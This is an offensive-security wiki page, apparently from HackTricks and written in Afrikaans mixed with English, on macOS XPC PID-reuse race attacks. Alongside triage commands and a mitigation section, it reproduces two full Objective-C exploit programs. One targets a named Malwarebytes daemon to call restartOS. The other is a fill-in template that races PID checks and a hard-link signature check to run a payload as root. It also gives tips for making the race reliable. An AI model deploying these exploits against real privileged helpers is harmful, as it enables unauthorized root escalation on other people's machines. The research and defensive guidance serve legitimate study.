# macOS PID-hergebruik

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID-hergebruik

Wanneer 'n macOS **XPC service** 'n oproeper authentiseer deur sy **PID** op te los in plaas daarvan om credentials te gebruik wat aan die ontvangde boodskap gebind is, kan dit kwesbaar wees vir 'n PID reuse attack. Die praktiese primitive is nie om te wag totdat die PID namespace omvou nie: die aanvaller stuur 'n XPC request en roep onmiddellik **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** met `POSIX_SPAWN_SETEXEC` aan, wat die aanvaller se process image vervang met 'n **allowed binary terwyl die PID behoue bly**.<sup>[[1]](#references)[[2]](#references)</sup>

As die server die request uit die queue haal en eers daarna daardie numeriese PID na 'n lewende process oplos vir code-signing-, entitlement-, path- of parent-process-kontroles, sien dit die replacement binary in plaas van die process wat die boodskap gestuur het. `POSIX_SPAWN_START_SUSPENDED` hou die trusted replacement lewend en stabiel terwyl die server die kontrole uitvoer.<sup>[[1]](#references)[[2]](#references)</sup>

### Wat eintlik gerace word

Die kwesbare sequence is 'n **message-identity TOCTOU**, nie bloot “PIDs can repeat” nie:<sup>[[1]](#references)[[2]](#references)</sup>

1. 'n Aanvaller-process vestig of hervat 'n XPC connection en plaas die privileged request in die queue.
2. Voordat die service die connection se PID na 'n `SecCodeRef` of 'n ander process object omskakel, overlay die aanvaller dieselfde process met 'n approved executable deur `POSIX_SPAWN_SETEXEC` te gebruik.
3. Die service valideer die approved image wat tans aan daardie PID geheg is, en dispatch daarna die reeds gequeue'de attacker-controlled request.

Enige PID bridge in 'n authorization data flow is verdag: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid`, of `audit_token_to_pid` gevolg deur `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)`, of 'n custom signature verifier. 'n PID wat slegs vir logging gebruik word, is nie genoeg nie; bevestig dat dit die allow/deny-besluit bereik. Inspekteer ook error paths: om eers 'n audit-token lookup te probeer, maar **terug te val na die PID indien dit misluk**, herstel dieselfde race. Hierdie fallback pattern het in 'n 2026-analise van Intego se privileged XPC services verskyn.<sup>[[3]](#references)</sup>

### Vinnige static en dynamic triage

Begin by die connection handler en trace elke PID-producing call na code-signing-, entitlement-, executable-path- of version-kontroles. Hierdie commands bied 'n vinnige eerste ondersoek van 'n kandidaat-helper; stripped binaries stel steeds dikwels imported symbols, Objective-C selectors of diagnostic strings bloot:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Tydens ’n beheerde toets, breek of hook beide die PID-bron en sy verifier. ’n Treffer op `xpc_connection_get_pid` of `-processIdentifier` is slegs ’n leidraad; die nuttige bewys is ’n latere lookup van die **same integer** nadat die versoek ontvang is. Frida kan ook die toepassingspesifieke verifier en bevoorregte selector hook om te meet of die selector uitgevoer word wanneer die PID-race wen.<sup>[[3]](#references)</sup>

### Exploit-voorbeeld

As jy die funksie **`shouldAcceptNewConnection`** vind, of ’n funksie wat daardeur aangeroep word en **`processIdentifier`** **calling** is sonder om **`auditToken`** aan te roep, beteken dit hoogs waarskynlik dat dit die **process PID** verifieer en nie die audit token nie.\
Soos byvoorbeeld in hierdie image (geneem uit die reference):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Kyk na hierdie exploit-voorbeeld (weereens geneem uit die reference) om die 2 dele van die exploit te sien:<sup>[[1]](#references)</sup>

- Een wat verskeie forks **genereer**
- **Elke fork** sal die **payload** na die XPC service **stuur** terwyl dit **`posix_spawn`** net ná die stuur van die boodskap uitvoer.

> [!CAUTION]
> Wanneer jy met `fork()` vanuit ’n Objective-C-process race, begin die exploit met `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` geëksporteer, of embed die `__objc_fork_ok`-marker:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Eerste opsie wat **`NSTasks`** en ’n argument gebruik om die children te launch en die RC te exploit.
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Hierdie voorbeeld gebruik ’n rou **`fork`** om **kinderprosesse te begin wat die PID race condition sal uitbuit** en dan **nog ’n race condition via ’n Hard link uit te buit:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Maak die race reproduceerbaar

Die volgende verstellingspunte kom herhaaldelik voor in werkende PID-reuse exploits en onlangse privileged-helper testing:<sup>[[1]](#references)[[3]](#references)</sup>

- Stuur die versoek en roep `posix_spawn` onmiddellik aan; moenie vir die antwoord wag nie. Die versoek moet reeds in die queue wees terwyl die server se PID-lookup ná die image replacement plaasvind.
- Hou `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` saam. Die eerste flag behou die racing process se PID; die tweede voorkom dat die geldige teiken uittree of van toestand verander voordat validasie plaasvind.
- Gebruik verskeie kortlewende racers en herhaal die volledige connection/request/exec-sequence. Die optimale aantal hang van die teiken af; te veel children kan die service vertraag en die window vererger.
- Die replacement moet aan die server se **volledige** vereiste voldoen. Hergebruik die legitimate client binary waar moontlik en kontroleer eers sy designated requirement met `codesign -d -r- "/path/to/client.app"`.
- Roep eers ’n harmless exported selector of ’n read-only method aan. Dit skei suksesvolle authentication van die suksesvolle exploitation van ’n latere privileged primitive.

## Vermy die PID bridge

Op macOS 13+ stel Foundation `-[NSXPCConnection setCodeSigningRequirement:]` beskikbaar. Stel die peer requirement presies een keer en **voor** `resume`; malformed requirement strings veroorsaak ’n exception (of ’n Swift fatal error), en ’n message van ’n peer wat nie aan die requirement voldoen nie, maak die connection ongeldig. Dit laat XPC die peer se code identity afdwing sonder dat application code ’n PID resolve.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Vir die moderne low-level listener API op macOS 26+ pas `xpc_listener_set_peer_requirement` ’n gevalideerde `xpc_peer_requirement_t` toe terwyl die listener onaktief is. XPC verwerp requests wat nie daaraan voldoen nie; peer-sessies wat vanaf die listener geskep word, erf dit **nie**, dus moet ’n toepaslike session requirement ook toegepas word wanneer daardie sessies bevoorregte operasies autoriseer.<sup>[[7]](#references)</sup>

> [!WARNING]
> Moenie dit “regmaak” deur ’n audit token te kopieer en dit dan weer na ’n PID om te skakel vir die werklike `SecCode` lookup nie. Behou die audit-token-afgeleide identiteit deur die autorisasiebesluit, of gebruik ’n XPC peer-requirement API end-to-end.<sup>[[2]](#references)[[6]](#references)</sup> Die connection-wide audit-token APIs het ook ’n afsonderlike race-klas, wat gedek word in [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Other examples

- [**Intego X9: Waarom jou macOS-antivirus nie PIDs moet vertrou nie**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE teen ’n AV se bevoorregte helper wat clients volgens PID geauthentiseer het.<sup>[[3]](#references)</sup>
- [**Exploiting GOG Galaxy XPC service for privilege escalation in macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Learn XPC exploitation - Part 2: Sê nee vir die PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Moenie die PID vertrou nie! Stories of a simple logic bug and where to find it - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Waarom jou macOS-antivirus nie PIDs moet vertrou nie](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Exploiting GOG Galaxy XPC service for privilege escalation in macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Deel II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
